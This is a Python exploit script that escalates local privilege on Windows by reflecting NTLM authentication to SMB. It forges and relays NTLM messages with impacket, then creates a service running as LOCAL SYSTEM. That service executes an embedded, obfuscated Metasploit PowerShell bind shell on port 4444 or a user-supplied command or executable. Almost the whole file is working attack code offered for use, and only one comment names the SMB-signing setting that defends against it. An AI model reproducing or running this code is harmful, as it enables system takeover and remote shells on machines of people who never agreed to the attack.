#!/usr/bin/python
# Use npcap for sniffing local traffic
# The setting to "defend" yourself
# Set-Itemproperty -Path HKLM:System\CurrentControlSet\Services\LanManServer\Parameters -name "RequireSecuritySignature" -value 1
import socket
import argparse
import sys
import time
import thread
import subprocess
import re
# For http
import SimpleHTTPServer
import SocketServer
# For impacket
from impacket.ntlm import *
from impacket import smb3
from impacket.smb3structs import *
from impacket.smbconnection import *
from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
# For TSCH and powershell method
from impacket.dcerpc.v5 import tsch, transport, scmr
from impacket.dcerpc.v5.dtypes import NULL

from impacket.examples import serviceinstall
from threading import Thread
# import atexec
DEBUG = False



#############################################################################################
#############################################################################################
# windows/powershell_bind_tcp port 4444 made with metasploit psexec_psh
pshell_command = "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''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''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
#############################################################################################

# add your own here or with -c "powershell.exe -window hidden -enc JAAHxAA" .. there is a chr limit 
pshell_base = "%COMSPEC% /b /c start /b /min "

#############################################################################################
#############################################################################################
#############################################################################################		
class do_smb_attack(Thread):
    def __init__(self, SMBClient, execom):
        Thread.__init__(self)
        self.installService = serviceinstall.ServiceInstall(SMBClient, execom)
    
    def run(self):
        # Here PUT YOUR CODE!
        result = self.installService.install()
        if result is True:
            print("Service Installed.. CONNECT!")
            self.installService.uninstall()


class do_pshell_attack(Thread):
    def __init__(self, SMBClient):
        Thread.__init__(self)
        self.daemon = True
        self.connection = SMBClient
	
    def Opensvc(self):
		_rpctransport = transport.SMBTransport(self.connection.getRemoteHost(), self.connection.getRemoteHost(),filename = r'\svcctl', smb_connection = self.connection)
		self.rpcsvc = _rpctransport.get_dce_rpc()
		self.rpcsvc.connect()
		self.rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
		try:
			# open a handle to the scmanager
			resp = scmr.hROpenSCManagerW(self.rpcsvc)
		except:
			print("Couldnt open SVCManager")
		return resp['lpScHandle']
	
    def run(self):
		#if isinstance(SMBObject, smb.SMB) or isinstance(SMBObject, smb3.SMB3):
		self.connection = SMBConnection(existingConnection = self.connection.getSMBServer()) # lower_level smb connection needed
		self.__service_name = 'WindowsTempService111'
		# Open the servicemanager via rpc over smb and return the handle
		self.svcManager = self.Opensvc()
		try:
			# try and open the service
			resp =  scmr.hROpenServiceW(self.rpcsvc, self.svcManager, self.__service_name+'\x00')
			temp_handle = resp['lpServiceHandle']
		except Exception, e:
			if str(e).find('ERROR_SERVICE_DOES_NOT_EXIST') >= 0:
                # We're good, pass the exception
				pass
			else:
				raise e
		else:
			# delete it if it is already there!
			scmr.hRDeleteService(self.rpcsvc, temp_handle)
			scmr.hRCloseServiceHandle(self.rpcsvc, temp_handle)
		
		try: 
			# create the service
			# The powershell command goes here btw, default or otherwise
			resp = scmr.hRCreateServiceW(self.rpcsvc, self.svcManager, self.__service_name + '\x00', self.__service_name + '\x00', lpBinaryPathName = pshell_command + '\x00')
			# The services handle
			service_handle = resp['lpServiceHandle']
		except:
			if DEBUG: print("Error creating service %s on %s" % (self.__service_name, self.connection.getRemoteHost()))
			raise
		else:
			pass
            #return resp['lpServiceHandle']
		
		try:
			# Start the service
			print("Starting the service we created as LOCAL SYSTEM")
			scmr.hRStartServiceW(self.rpcsvc, service_handle)
			# close the service handle and service manager handle
			scmr.hRCloseServiceHandle(self.rpcsvc, service_handle)
			scmr.hRCloseServiceHandle(self.rpcsvc, self.svcManager)
		except Exception, e:
			# It is normal to timeout starting, im not sure why tho!
			pass
			
		
		try:
			# Stop the service
			self.svcManager2 = self.Opensvc()
			resp = scmr.hROpenServiceW(self.rpcsvc, self.svcManager2, self.__service_name+'\x00')
			service_handle_del = resp['lpServiceHandle'] 
			scmr.hRControlService(self.rpcsvc, service_handle_del, scmr.SERVICE_CONTROL_STOP)
		except:
			# not a big deal it should be stopped already
			pass
		try:
			# Delete the service
			scmr.hRDeleteService(self.rpcsvc, service_handle_del)
			# Close the service handle
			scmr.hRCloseServiceHandle(self.rpcsvc, service_handle_del)
			# Close the scm handle
			scmr.hRCloseServiceHandle(self.rpcsvc, self.svcManager2)
			print("Attack is finished!")
		except Exception, e:
			# Pass it dont matter if it doesnt delete
			print "error occored"
			print e
			pass

def attack_caller(con):
	# <~~~ This is where you can add your own attack if you want! ~~~>
	if attack == 1:
		if DEBUG: print("Starting powershell service start")
		t = do_pshell_attack(con)
		t.start()
	elif attack == 2:
		if DEBUG: print("Starting powershell service start")
		t = do_pshell_attack(con)
		t.start()
	elif attack == 3:
		if DEBUG: print("Starting SMB upload and service start")
		t = do_smb_attack(con,execom)
		t.start()
	elif attack == 4:
		print "not yet"

#####################################################
#####################################################
# Here we call our connection and return the hash2
def send_smb(hash):
	if DEBUG: print("Making the smb, connection.")
  	client = SMBClient2(target)
	if DEBUG: print("SMB connection made to target %s" % target)
  	hash2recv = client.send_hash1(hash)
  	return hash2recv, client



# This is how we do the smb connection, its ripped from impacket and not the "cleanest" way
class SMBClient2(SMBConnection):
    def __init__(self, remote_name, sess_port = 445, preferredDialect = SMB2_DIALECT_21):
        # User the upper level SMBConnection for the negotiate, "usefull for the payloads"
        SMBConnection.__init__(self ,remote_name, remote_name, sess_port=sess_port, preferredDialect = SMB2_DIALECT_21)
        # Get the lower level smb3 context for all the hash stuff
        self.low_level = self.getSMBServer()
    
    def send_hash3(self, servChallenge, authenticateMessageBlob):
        # servChallenge is nothing for now but needed for signing ?
        # We can reuse sessionSetup from sendNegotiate
        respToken2 = SPNEGO_NegTokenResp()
        respToken2['ResponseToken'] = str(authenticateMessageBlob)
        sessionSetup['SecurityBufferLength'] = len(respToken2)
        sessionSetup['Buffer']               = respToken2.getData()
        # Setup a new packet struct!
        packet = self.low_level.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data']    = sessionSetup
        # if DEBUG: print("Dumping packet: %s", packet.dump())
        packetID = self.low_level.sendSMB(packet)
        resp = self.low_level.recvSMB(packetID)
        # A better way to do this im sure
        try:
            error_code = resp.isValidAnswer(0x00000000)
        except:
            error_code = False
            print("Unable to login... try harder?")
            pass
        return error_code
    
    def send_hash1(self, negotiateMessage):
        global sessionSetup
        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0
        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        # This is where we input the Hash1
        blob['MechToken'] = str(negotiateMessage)
        sessionSetup['SecurityBufferLength'] = len(blob)
        sessionSetup['Buffer']               = blob.getData()
        # sessionSetup['Parameters'].getData()
        packet = self.low_level.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP # 0x0001
        packet['Data']    = sessionSetup
        # We send it here!!
        packetID = self.low_level.sendSMB(packet)
        resp = self.low_level.recvSMB(packetID)
        # use this sessionid for all furture requests
        self.low_level._Session['SessionID'] = resp['SessionID']
        # Build our hash2 return
        sessionSetupResponse = SMB2SessionSetup_Response(resp['Data'])
        respToken = SPNEGO_NegTokenResp(sessionSetupResponse['Buffer'])
        return respToken['ResponseToken']

#####################################################
#####################################################
#####################################################
#####################################################
def make_hashes(hostname=False, dname=False):
	# This is how we make the hash1 and hash3, i messed with the flags so much i basically
	# gave up once it worked, if it needs retooling let me know
	h1 = NTLMAuthNegotiate()

	# We are setting our own hash1 flags
	h1flags = NTLMSSP_UNICODE | NTLMSSP_OEM | NTLMSSP_TARGET |  NTLMSSP_LM_KEY | NTLMSSP_NTLM_KEY | NTLMSSP_DOMAIN | NTLMSSP_WORKSTATION | \
	NTLMSSP_ALWAYS_SIGN | NTLMSSP_NTLM2_KEY | NTLMSSP_KEY_128 | NTLMSSP_KEY_56
	
	# NTLMSSP_KEY_EXCHANGE | NTLMSSP_VERSION |
	# version is win10
	# hash1['os_version'] = '\x0a\x00\x00\x28\x00\x00\x00\x0f'
	
	# This is how we set our host and domain, this seems to work but could cause issues.
	# Regardless you MUST MUST MUST!! have the correct host and domain.
	# Its the key to everything, if you send the correct host and domain then the system
	# will see it as a SMB localcall.
	
	h1['host_name'] = socket.gethostname()
	if socket.getfqdn() == socket.gethostname():
		h1['domain_name'] = 'WORKGROUP'
	else:
		try:
			name = socket.getfqdn().split('.')[1].upper()
			h1['domain_name'] = name
		except:
			print "Error with the Domain name, try manually entering it."
	
	if hostname and dname:
		# add the option to input your own... rem00t!
		h1['host_name'] = hostname
		h1['domain_name'] = dname
	else:
		pass
	
	print("Using %s\\%s as Host\\Domain name" % (h1['host_name'], h1['domain_name']))
	# Self explanitary and then we are done building hash1
	h1['flags'] = h1flags
	h1string = h1.getData()
	hash1 = str(h1string)

	###### HASH3 #########
	# Looking back this probaby wasnt the easiest way but it works
	# We define our own structure for the hash3, impacket's look different.
	class ntlmh3(Structure):
		structure = (
			('','"NTLMSSP\x00'),
			('message_type','<L=3'),
			('lanman',':'),
			('ntlm',':'),
			('domain_name',':'),
			('user_name',':'),
			('host_name',':'),
			('session_key',':'),
			('flags','<L'),
			('Version',':=""'),
			('MIC',':=""')
			)
	
	# Can be X or @, both work.. havent tried anything else.
	lol = '\x00\x00\x00\x00X\x00\x00\x00'
	h3 = ntlmh3()
	h3['domain_name'] = lol
	h3['user_name'] = lol
	h3['host_name'] = lol
	h3['lanman'] = lol
	h3['ntlm'] = lol
	h3['session_key'] = lol
	
	# Obveously set our own hash3 flags
	# Signing can be set even if its not used, 
	h3flags = NTLMSSP_UNICODE | NTLMSSP_TARGET | NTLMSSP_SIGN | NTLMSSP_NTLM_KEY | NTLMSSP_LOCAL_CALL | NTLMSSP_ALWAYS_SIGN | \
	NTLMSSP_NTLM2_KEY | NTLMSSP_TARGET_INFO | NTLMSSP_KEY_128 | NTLMSSP_KEY_EXCHANGE | NTLMSSP_KEY_56
	# NTLMSSP_OEM | NTLMSSP_VERSION | 
	
	h3['flags'] = h3flags
	# h3['Version'] = '\x0a\x00\x00\x28\x00\x00\x00\x0f'   # If we add this we also need a version flag!
	# Must include version if you have a session key and want a MIC
	h3['MIC'] = '\x00' * 16 # zero out message integrity
	hash3 = str(h3)
	return hash1, hash3


#####################################################
#####################################################
#####################################################
#####################################################
# These are our Gender-Bender settings

def main(proxymode, target, local):
	# target isnt needed, we do it another way for now
	# Start the Gender-Bender
	if proxymode:
		print("Starting proxymode on %s" % local)
		s = GenderMyBender(local)
		s.start()
		# thread.start_new_thread(server,())
	else:
		print("Starting webserver on %s" % local)
		s = HTTPRelayServer(local)
		s.start()
	time.sleep(2)
	# Start the PoC just for testing this script
	thread.start_new_thread(app(),)
	while True:
		time.sleep(1)

def app():
	ftime = time.time() + 62
	start_time = ':'.join(time.ctime(ftime).split(' ')[3].split(':')[:2])
	# ya this is really all it takes
	subprocess.call(["schtasks.exe", "/Create", "/TN", "omg_ms", "/TR", 
    "\\\\127.0.0.1\\fucked_you_are", "/SC", "ONCE", "/ST", start_time, "/F"])
	subprocess.call(["schtasks.exe", "/Delete", "/TN", "omg_ms", "/F"])

##################################################
##################################################
# Gender bender for testing
class GenderMyBender(Thread):
	def __init__(self, local):
		Thread.__init__(self)
		self.daemon = True
		# presetting these so you dont have 100 switches to input
		self.listen_port = 6666
		self.listen_ip = local
		self.forward_port = 135
		self.forward_ip = '127.0.0.1'
	
	def check_hash(self, data):
		nt = {}
		nt['NTLMSSP1'] = re.findall('NTLMSSP\x00\x01\x00\x00\x00.*[^EOF]*', data, re.DOTALL)
		nt['NTLMSSP2'] = re.findall('NTLMSSP\x00\x02\x00\x00\x00.*[^EOF]*', data)
		nt['NTLMSSP3'] = re.findall('NTLMSSP\x00\x03\x00\x00\x00.*[^EOF]*', data,re.DOTALL)
		if DEBUG: print(nt['NTLMSSP1'], nt['NTLMSSP2'], nt['NTLMSSP3'])
		return nt
	
	# We do this so.... wouldnt you like to know
	def interception(self, full_blob):
		if DEBUG: print("Starting the interception")
		b = re.compile('NTLMSSP\x00\x02\x00\x00\x00.*[^EOF]*', re.DOTALL)
		new_hash = b.sub(hash2, full_blob)
		return new_hash
	
	# Not needed if we make our own hash1 and hash3... srsly!
	# Weird is that if we change to unicode here and send OEM in hash2 to rpc it wont read
	def replace_sec_binding(self, data):
		# data = re.sub('\x97\xb2\x08\xe2', '\x97\xb2\x08\xe2', data) # the old way
		# escape?
		dbg = '\\x' + '\\x'.join(x.encode('hex') for x in str(data[12:16]))
		if DEBUG: print("Replacing security binding %s in hash1 with \\x07\\xb2\\x08\\xe2" % dbg)
		# '\x97\xb2\x08\xe2' <- orig 
		# '\x86\xb2\x08\xe2' <- fail
		ndata = data[:12] + '\x07\xb2\x08\xe2' + data[16:]
		return ndata
	
	# The is the Gender-Bender in full effect
	def server(self):
		try:
			dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			dock_socket.bind((self.listen_ip, self.listen_port))
			dock_socket.listen(5)
			while True:
				client_socket = dock_socket.accept()[0]
				server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				server_socket.connect((self.forward_ip, self.forward_port))
				thread.start_new_thread(self.client_to_server, (client_socket, server_socket))
				thread.start_new_thread(self.server_to_client, (server_socket, client_socket))
		except Exception, e:
			if DEBUG: print(e)
			pass
	
	
	# The first part of our Gender-Bender, its used to start the smb connection.
	def client_to_server(self, source, destination):
		string = ' '
		while string:
			string = source.recv(1024)
			if string:
				time.sleep(1) # slow it down a little
				if DEBUG: print("Client Sent: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(string)))
				nt = self.check_hash(string)
				if nt['NTLMSSP1']:
					global hash2 # ugly but it works
					if make_our_hash:
						# We send our premade hash1, and receive the hash2 and client connection.
						ntlm_hash2, client = send_smb(hash1)
					else:
						# The tricky part?
						nt['NTLMSSP1'][0] = self.replace_sec_binding(str(nt['NTLMSSP1'][0]))
						ntlm_hash2, client = send_smb(str(nt['NTLMSSP1'][0]))
					# Lets pull out the hash2 from smb
					self.challengeMessage = NTLMAuthChallenge()
					self.challengeMessage.fromString(ntlm_hash2)
					# Funny thing is we can use our own challenge msg ... srsly!?!?!?!?!
					# challengeMessage['challenge'] = '\x11\x22\x33\x44\x55\x66\x77\x88'
					# remember global.. we send it back in the other thread ;)
					hash2 = str(self.challengeMessage)
				if nt['NTLMSSP3']:
					# Lets debug what type of smb connection we have since we now know
					if DEBUG: print("Using SMB dialect: %s" % client.getDialect())
					if make_our_hash:
						# Send our own hash3
						errorCode = client.send_hash3(self.challengeMessage['challenge'], hash3)
					else:
						# Send the actual hash3
						errorCode = client.send_hash3(self.challengeMessage['challenge'], str(nt['NTLMSSP3'][0]))
					if errorCode != True:
						if DEBUG: print("Authentication FAILED")
						# Exit here somehow... not worried about it!
					else:
						# Relay worked, do whatever we want here...
						if DEBUG: print("Authentication SUCCESS")
						attack_caller(client)
						time.sleep(20) # Sleep is good...
						break # try and exit, but we probably wont.. why??
				destination.sendall(string)
			else:
				source.shutdown(socket.SHUT_RD)
				destination.shutdown(socket.SHUT_WR)
	
	# The second part of our Gender-Bender, its used to replay the Hash2 back to the "PoC"
	def server_to_client(self, source, destination):
		string = ' '
		while string:
			time.sleep(1)  # Slow it down a little
			string = source.recv(1024)
			if string:
				if DEBUG: print("Server Sent: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(string)))
				nt = self.check_hash(string)
				if nt['NTLMSSP2']:
					full_blob = string
					# make our own hash2 based off the reply
					new_hash = self.interception(full_blob)
					string = new_hash
				destination.sendall(string)
			else:
				source.shutdown(socket.SHUT_RD)
				destination.shutdown(socket.SHUT_WR)		
	def run(self):
		self.server()

##################################################
##################################################
# The http server
class HTTPRelayServer(Thread):
	class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
		# Start the server
		def __init__(self, server_address, RequestHandlerClass):
			SocketServer.TCPServer.__init__(self,server_address, RequestHandlerClass)

	class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
		# This is the request handler
		def __init__(self,request, client_address, server):
			self.server = server
			self.protocol_version = 'HTTP/1.1'
			SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
		
		# Fuck the log messages
		def log_message(self, format, *args):
			pass

		def handle_one_request(self):
			try:
				SimpleHTTPServer.SimpleHTTPRequestHandler.handle_one_request(self)
			except:
				pass
             
		def do_HEAD(self):
			# Send response code
			self.send_response(200)
			# We can send various headers this way
			self.send_header('Content-type', 'text/html')
			self.end_headers()

		def do_AUTHHEAD(self, message = ''):
			# This is the setup part of our responses
			self.send_response(401)
			self.send_header('WWW-Authenticate', message)
			self.send_header('Content-type', 'text/html')
			self.send_header('Content-Length','0')
			self.end_headers()

		def do_OPTIONS(self):
			messageType = 0
			# If no Auth in the header send NTLM to start
			if self.headers.getheader('Authorization') == None:
				self.do_AUTHHEAD(message = 'NTLM')
				pass
			else:
				typeX = self.headers.getheader('Authorization')
				try:
					# split the NTLM * from the header
					_, blob = typeX.split('NTLM')
					# Strip it b64 decode and rename to token
					token =  base64.b64decode(blob.strip())
				except:
					self.do_AUTHHEAD()
				# Set the msg type depending on how long the token is
				messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

			if messageType == 1:
				if make_our_hash:
					# I thought I would include this its our own hash
					if DEBUG: print("Sending our premade hash1")
					if DEBUG: print("Premade hash1 Hex:" + '\\x' + '\\x'.join(x.encode('hex') for x in str(hash1)))
					# Get the hash2
					self.ntlm_hash2, self.client = send_smb(hash1)
				else:
					# Or do the normal reflection
					if DEBUG: print("Relaying webdav hash1")
					if DEBUG: print("Webdav hash1 Hex:" + '\\x' + '\\x'.join(x.encode('hex') for x in str(token)))
					# Get the hash2
					self.ntlm_hash2, self.client = send_smb(str(token))
				if DEBUG: print("SMB hash2 Hex: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(self.ntlm_hash2)))
				# Funny thing is we can use our own challenge msg ... srsly!?!?!?!?!
				# challengeMessage['challenge'] = '\x11\x22\x33\x44\x55\x66\x77\x88'
				# Lets pull out the hash2 challenge from smb
				self.challengeMessage = NTLMAuthChallenge()
				self.challengeMessage.fromString(str(self.ntlm_hash2))
				if DEBUG: print("SMB hash2 challenge: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(self.challengeMessage['challenge']))) 
				# Encode the challenge and send it through the webserver
				self.do_AUTHHEAD(message = 'NTLM '+base64.b64encode(self.ntlm_hash2))
			elif messageType == 3:
				# Lets debug what type of smb connection we have since we now know
				if DEBUG: print("Using SMB dialect: %s" % self.client.getDialect())
				if DEBUG: print("Got our hash3 from webdav")
				# The option to make our own hash... its pretty damn funny really!!!
				if make_our_hash:
					if DEBUG: print("Premade hash3 Hex: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(hash3)))
					success = self.client.send_hash3(self.challengeMessage['challenge'], hash3)
				else:
					if DEBUG: print("Webdav hash3 Hex: %s" % '\\x' + '\\x'.join(x.encode('hex') for x in str(token)))
					success = self.client.send_hash3(self.challengeMessage['challenge'], str(token))  
				# Noisy but lets not care for the moment.
				if success:
					# Relay worked, do whatever we want here...
					if DEBUG: print("Authentication SUCCESS")
					print("Starting your attack!")
					attack_caller(self.client)
					time.sleep(20) # Let this finish ... then we can exit if we like
					self.send_response(404)
					self.send_header('WWW-Authenticate', 'NTLM')
					self.send_header('Content-type', 'text/html')
					self.send_header('Content-Length','0')
					self.end_headers()
				else:
					if DEBUG: print("Authentication FAILED")
					sys.exit(1)
					# self.do_AUTHHEAD('NTLM') # We should just exit here, no point in blowing up the logs rly
			return 

	def __init__(self, local):
		Thread.__init__(self)
		self.daemon = True
		self.local = local

	def run(self):
		self.httpd = self.HTTPServer((self.local, 80), self.HTTPHandler)
		self.httpd.serve_forever()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help = False, description = "Local priv via smb2... no signing yet")
	parser.add_argument('-p', action='store_true', required=False, help='Proxy mode on 6666...')
	parser.add_argument('-o', action='store_true', required=False, help='Output some threading errors')
	parser.add_argument('-t', action='store', metavar = 'Target-IP', required=False, help='Target to attack')
	parser.add_argument('-l', action='store', metavar = 'Local-IP', required=False, help='IP to serv on.. privs needed!')
	parser.add_argument('-u', action='store_true', required=False, help='Default powershell on 4444')
	parser.add_argument('-v', action='store_true', required=False, help='Verbose mode')
	parser.add_argument('-h', action='store_true', required=False, help='Help')
	parser.add_argument('-e', action='store', required=False, metavar = 'File', help='File to upload and execute.')
	parser.add_argument('-r', action='store_true', required=False, help='Dont use premade hashes')
	parser.add_argument('-i', action='store', metavar = 'Host\Domain', required=False, help='Host\Domain to use in hash1')
	parser.add_argument('-c', action='store', required=False, metavar = 'PShell', help='Command, net user & etc..')

	# Need atleast 1 switch or help
	if len(sys.argv)==1:
		parser.print_help()
		sys.exit(1)
	
	# Set the parser up
	try:
		options = parser.parse_args()
	except Exception, e:
		print(str(e))
		sys.exit(1)
	
	# Help options
	if options.h:
		parser.print_help()
		sys.exit(1)
	
	# Setting the target
	if options.t:
		if len(sys.argv) < 3:
			parser.print_help()
			sys.exit(1)
		
		target = options.t
	else:
		target = '127.0.0.1'
	
	# Setting the local address to listen on
	if options.l:
		if len(sys.argv)==3:
			parser.print_help()
			sys.exit(1)
		else:
			pass
		local = options.l
	else:
		local = '127.0.0.1'
	
	# Set attack option or error out
	if options.u:
		attack = 1
	elif options.c:
		attack = 2
		pshell_command = pshell_base + options.c
	elif options.e:
		execom = options.e
		attack = 3
	else:
		parser.print_help()
		sys.exit(1)
	
	# Premade hash option
	if options.r:
		make_our_hash = False
	else:
		make_our_hash = True
	
	# Debug option
	if options.v:
		DEBUG = True
	
	# Output thread errors to file
	if options.o:
		if options.v:
			print("Logging to error.log")
			sys.stderr = file('error.log', 'a')
		else:
			print("Only use with verbose mode")
	else:
		sink = ''
		sys.stderr = sink
	
	# Option to set host\domain
	if options.i:
		host = options.i.split('\\')[0]
		dmain = options.i.split('\\')[1]
		hash1, hash3 = make_hashes(host,dmain)
	else:
		hash1, hash3 = make_hashes()
	
	# Setting the mode, and start
	if options.p:
		main(True, target, local)
	else:
		main(False, target, local)
